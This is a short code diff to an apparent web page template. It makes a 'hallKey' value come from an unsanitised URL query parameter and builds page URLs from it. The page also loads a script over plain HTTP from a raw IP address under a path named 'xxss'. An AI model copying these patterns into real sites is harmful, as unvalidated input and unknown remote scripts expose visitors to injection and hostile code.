@@ -20,7 +20,16 @@
 		 var hallUrl= window.location.href;
 		 var baseUrl= "http://" + window.location.host;
 		 var hall= "xss";
-		 var hallKey= "{HALLCODE}";
+         var hallKey= getQueryVariable("h")?getQueryVariable("h"):"";
+         function getQueryVariable(variable){
+             var query = window.location.search.substring(1);
+             var vars = query.split("&");
+             for (var i=0;i<vars.length;i++) {
+                 var pair = vars[i].split("=");
+                 if(pair[0] == variable){return pair[1];}
+             }
+             return(false);
+         }
 </script>
 <script>
 	var wx_ip = "";
@@ -51,6 +60,9 @@
 	 var indexUrl= "http://" + window.location.host+"/"+hallKey+".html";
 </script>
 <script src="http://110.42.3.148:1662/xxss/common.js" charset="utf-8"></script>
+<script>
+    var baseUrl= "http://" + window.location.host+"/"+hallKey+".html";
+</script>
 	
     <script type="text/javascript">
         document.documentElement.style.fontSize = document.documentElement.clientWidth / 360 * 100 + 'px';
